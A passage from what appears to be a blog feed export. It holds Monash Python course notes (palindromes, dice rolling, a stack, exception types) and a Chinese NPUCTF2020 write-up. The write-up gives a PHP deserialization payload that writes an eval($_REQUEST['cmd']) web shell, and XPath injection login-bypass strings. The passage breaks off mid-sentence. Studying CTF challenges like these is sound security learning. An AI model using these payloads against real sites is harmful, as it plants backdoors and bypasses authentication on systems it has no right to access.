<p><code>isdigit()</code> 方法可以检查字符串中是否仅包含数字，如果字符串中包含除数字以外的字符，它将返回False。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_palindrome</span>():</span><br><span class="line">    enter_string = <span class="built_in">input</span>(<span class="string">&quot;Enter a value: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> enter_string.isdigit() == <span class="literal">True</span>:</span><br><span class="line">        reverse_string = enter_string[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> enter_string == reverse_string:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;True, &#x27;Integer&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;False, &#x27;Integer&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> enter_string.isalpha() == <span class="literal">True</span>:</span><br><span class="line">        reverse_string = enter_string[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> enter_string == reverse_string:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;True, &#x27;String&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;False, &#x27;String&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong argument provided&quot;</span>)</span><br><span class="line">        </span><br><span class="line">check_palindrome()</span><br></pre></td></tr></table></figure></div>

<h3 id="Dice-Roll"><a href="#Dice-Roll" class="headerlink" title="Dice Roll"></a>Dice Roll</h3><p>Write a python program that asks a users to select a dice to roll from a menu and roll that dice using a function named <code>roll_dice</code> that takes one argument from [4, 6, 8, 10, 12, 20, 100] and return the one random value from the specified dice.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Which Dice you want to roll?</span></span><br><span class="line"><span class="string">    Enter the number on left side to roll a dice</span></span><br><span class="line"><span class="string">    1....d4</span></span><br><span class="line"><span class="string">    2....d6</span></span><br><span class="line"><span class="string">    3....d8</span></span><br><span class="line"><span class="string">    4....d10</span></span><br><span class="line"><span class="string">    5....d12</span></span><br><span class="line"><span class="string">    6....d20</span></span><br><span class="line"><span class="string">    7....d100</span></span><br><span class="line"><span class="string">    8....Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>():</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> choice.isdigit() == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D4 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D6 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D8 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D10 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D12 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">20</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D20 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D100 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;see U&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You have enter invalid choice. Try again&quot;</span>)</span><br><span class="line">            choice = <span class="built_in">input</span>(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">choice()</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h2><h3 id="workshop-Balanced-Parenthesis"><a href="#workshop-Balanced-Parenthesis" class="headerlink" title="workshop Balanced Parenthesis"></a>workshop Balanced Parenthesis</h3><p><strong>Stack ADT</strong><br>Compare those above with the following, which are not balanced:</p>
<p><code>((()</code></p>
<p><code>()()()(()</code></p>
<p><code>((()))(</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="comment"># creates a new stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.the_stack = [] <span class="comment"># represent the stack as a list</span></span><br><span class="line">        self.count = <span class="number">0</span> <span class="comment"># indicate the current size of the stack</span></span><br><span class="line">        self.top = -<span class="number">1</span> <span class="comment"># indicate the top position of the stack</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns the number of items in the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.count</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns True if the stack is empty or False otherwise</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_empty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self) == <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># pushes an item onto the top of the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, item</span>):</span><br><span class="line">        self.the_stack.append(item)</span><br><span class="line">        self.top += <span class="number">1</span></span><br><span class="line">        self.count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># removes and returns the top item on the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.is_empty(), <span class="string">&quot;Cannot pop from an empty stack&quot;</span></span><br><span class="line">        </span><br><span class="line">        item = self.the_stack[self.top]</span><br><span class="line">        self.top -= <span class="number">1</span></span><br><span class="line">        self.count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">del</span> self.the_stack[<span class="built_in">len</span>(self)]</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns the item on the stack without removing it</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.is_empty(), <span class="string">&quot;Cannot peek at an empty stack&quot;</span></span><br><span class="line">        item = self.the_stack[self.top]</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_balanced_parenthesis</span>(<span class="params">string_of_parenthesis</span>):</span><br><span class="line">    <span class="comment"># Your solution goes here </span></span><br><span class="line">    stack = Stack()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> string_of_parenthesis:</span><br><span class="line">        <span class="keyword">if</span> p == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            stack.push(p)</span><br><span class="line">        <span class="keyword">elif</span> p == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> stack.is_empty():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stack.pop()</span><br><span class="line">    <span class="keyword">return</span> stack.is_empty()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis(<span class="string">&#x27;((()&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis(<span class="string">&#x27;(())&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis((<span class="string">&#x27;()()()(()&#x27;</span>)))</span><br></pre></td></tr></table></figure></div>

<h3 id="applied"><a href="#applied" class="headerlink" title="applied"></a>applied</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.display <span class="keyword">import</span> YouTubeVideo</span><br><span class="line"><span class="comment"># display(YouTubeVideo(&quot;I2wURDqiXdM&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Laptop</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand</span>):</span><br><span class="line">        self.brand = brand</span><br><span class="line">       <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_brand</span>(<span class="params">self</span>): <span class="comment"># self is related itself </span></span><br><span class="line">        <span class="built_in">print</span>(lap1.brand)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_video</span>(<span class="params">self, video_id=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        display(YouTubeVideo(video_id))</span><br><span class="line"></span><br><span class="line">lap1 = Laptop(<span class="string">&quot;Lenovo&quot;</span>)</span><br><span class="line">lap1.print_brand()</span><br><span class="line"></span><br><span class="line">lap2 = Laptop(<span class="string">&quot;I2wURDqiXdM&quot;</span>)</span><br><span class="line"><span class="comment">#print(lap1.brand)</span></span><br><span class="line">lap2.play_video()</span><br></pre></td></tr></table></figure></div>

<h3 id="Class-variables"><a href="#Class-variables" class="headerlink" title="Class variables"></a>Class variables</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Laptop</span>:</span><br><span class="line">    object_counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increase_one</span>(<span class="params">self</span>):</span><br><span class="line">        Laptop.object_counter += <span class="number">1</span></span><br><span class="line">        self.counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">lap1 = Laptop()</span><br><span class="line">lap1.increase_one()</span><br><span class="line"><span class="built_in">print</span>(Laptop.object_counter)</span><br><span class="line"><span class="built_in">print</span>(lap1.counter)</span><br><span class="line">lap2 = Laptop()</span><br><span class="line">lap2.increase_one()</span><br><span class="line"><span class="built_in">print</span>(Laptop.object_counter)</span><br><span class="line"><span class="built_in">print</span>(lap2.counter)</span><br></pre></td></tr></table></figure></div>

<p>output </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h2><h3 id="SyntaxError"><a href="#SyntaxError" class="headerlink" title="SyntaxError:"></a>SyntaxError:</h3><p>Errors in the syntax of your program (parsing errors in Python)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> a_number &gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(a_number, “<span class="keyword">is</span> greater than <span class="number">2</span>”)</span><br></pre></td></tr></table></figure></div>

<h3 id="NameError-exception-in-Python"><a href="#NameError-exception-in-Python" class="headerlink" title="NameError: (exception in Python)"></a>NameError: (exception in Python)</h3><p>Attempt to use a variable (or value) before initialising it; attempt to use a module or function without first importing it</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_number = random.random()</span><br></pre></td></tr></table></figure></div>

<h3 id="TypeError-exception-in-Python"><a href="#TypeError-exception-in-Python" class="headerlink" title="TypeError: (exception in Python)"></a>TypeError: (exception in Python)</h3><p>Attempt to use incompatible data types within a single statement; attempt to pass an argument of the wrong type</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_number = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> a_number &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(a_number + “<span class="keyword">is</span> greater than <span class="number">2</span>”)</span><br></pre></td></tr></table></figure></div>

<p>or</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_function</span>(<span class="params">first_arg, second_arg</span>):</span><br><span class="line">    result = first_arg + second_arg</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_function(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<h3 id="ValueError-exception-in-Python"><a href="#ValueError-exception-in-Python" class="headerlink" title="ValueError: (exception in Python)"></a>ValueError: (exception in Python)</h3><p>Attempt to pass an argument with the correct type but with a wrong value</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sum_of_two = <span class="built_in">int</span>(‘<span class="number">1</span>’) + <span class="built_in">int</span>(‘b’)</span><br></pre></td></tr></table></figure></div>

<h3 id="RuntimeError-exception-in-Python"><a href="#RuntimeError-exception-in-Python" class="headerlink" title="RuntimeError: (exception in Python)"></a>RuntimeError: (exception in Python)</h3><p>An error detected that doesn’t fall into any of the pre-defined error types</p>
<h3 id="Some-others-error"><a href="#Some-others-error" class="headerlink" title="Some others error"></a>Some others error</h3><ol>
<li>AttributeError</li>
</ol>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.y</span><br><span class="line">a_point = Point(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">a_point.set_x(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div>

<p>The code is responding with an <code>AttributeError</code> because the <code>set_x</code> method is not defined in the <code>Point</code> class. Therefore, when you try to call it on the <code>a_point</code> instance, Python raises an <code>AttributeError</code> because it cannot find the <code>set_x</code> method in the object’s attributes.</p>
<p>If the <code>set_x</code> method was defined in the <code>Point</code> class, but you still called it before defining it, then you would receive a <code>NameError</code>. The <code>NameError</code> would occur because Python would not recognize the <code>set_x</code> name and would not be able to resolve it to any defined object or method.</p>
<ol start="2">
<li>IndexError</li>
</ol>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [‘<span class="number">1</span>’, ‘<span class="number">2</span>’, ‘<span class="number">3</span>’] </span><br><span class="line"><span class="built_in">print</span>(a_list[<span class="number">3</span>])</span><br></pre></td></tr></table></figure></div>

<h3 id="Exception-Handling-Try-and-Except-and-Else"><a href="#Exception-Handling-Try-and-Except-and-Else" class="headerlink" title="Exception Handling: Try and Except and Else"></a>Exception Handling: Try and Except and Else</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter first number: &#x27;</span>))</span><br><span class="line">    num2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter second number: &#x27;</span>))</span><br><span class="line">    result = num1 // num2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Result of division:&#x27;</span>, result)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Invalid input value&#x27;</span>)</span><br><span class="line"><span class="comment">#except ZeroDivisionError:</span></span><br><span class="line"> <span class="comment">#   print(&#x27;Cannot divide by zero&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;else statement run when there is no exception&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>else:<ul>
<li>Comes after all the except blocks (optional)</li>
<li>Useful where some code should be executed if the try block does not raise any exception.</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Monash Cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Ha1cyonCTF2020-公开赛</title>
    <url>/yakko117/2020/04/18/NPUCTF2020/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>复现学习，还是学习到很多东西的</p>
<h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020] ReadlezPHP"></a>[NPUCTF2020] ReadlezPHP</h1><p>F12 源码看到 <code>/time.php?source</code><br>简单的链子，序列化对象 <code>assert</code> 传马</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;a = <span class="string">&#x27;file_put_contents(&quot;yakko.php&quot;, &quot;&lt;?php eval(\$_REQUEST[\&#x27;cmd\&#x27;]); ?&gt;&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="comment">//eval($h-&gt;a);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br></pre></td></tr></table></figure></div>

<p>Payload:<br><code>time.php?O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A67%3A%22file_put_contents%28%22yakko.php%22%2C+%22%3C%3Fphp+eval%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B+%3F%3E%22%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</code></p>
<p>然后蚁剑 绕过 <code>disable_fuction</code>, Payload <code>echo $FLAG</code></p>
<hr>
<h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020] ezlogin"></a>[NPUCTF2020] ezlogin</h1><p><a href="https://www.cnblogs.com/W4nder/p/12747742.html">https://www.cnblogs.com/W4nder/p/12747742.html</a><br><a href="https://shimo.im/docs/6hyIjGkLoRc43JRs/read">https://shimo.im/docs/6hyIjGkLoRc43JRs/read</a></p>
<p>登陆页面如下<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" class="lazyload"></a></p>
<p>查看源码，在 <code>static/main.js</code> 发现关键点</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">var</span> token = $(<span class="string">&quot;#token&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&quot;用户名和密码不能为空!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">&quot;&lt;username&gt;&quot;</span>+username+<span class="string">&quot;&lt;/username&gt;&quot;</span>+<span class="string">&quot;&lt;password&gt;&quot;</span>+password+<span class="string">&quot;&lt;/password&gt;&quot;</span>+<span class="string">&quot;&lt;token&gt;&quot;</span>+token+<span class="string">&quot;&lt;/token&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;login.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: function (result, status, xhr) &#123;</span><br><span class="line">          <span class="keyword">if</span>(result == <span class="string">&#x27;成功&#x27;</span>)&#123;</span><br><span class="line">            window.location.href = <span class="string">&#x27;admin.php&#x27;</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(result);</span><br><span class="line">          </span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看到熟悉的xml，一开始以为是XXE，（然后站被日了 &#x3D; &#x3D;<br>后来复现的时候，知道是 <a href="https://www.cnblogs.com/backlion/p/8554749.html">Xpath注入</a></p>
<h2 id="注入与绕过"><a href="#注入与绕过" class="headerlink" title="注入与绕过"></a>注入与绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> &quot;/root/accounts/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>万能密码，这点和<span class="keyword">SQL</span>很像；在知道用户名的情况：</span><br><span class="line">?name<span class="operator">=</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line">在不知道用户名的情况，使用两个<span class="keyword">or</span>绕过：</span><br><span class="line">?name<span class="operator">=</span>fake<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>使用<span class="operator">|</span>操作符，</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;]|//*|ss[&#x27;</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div>

<p>其执行的语句为：</p>
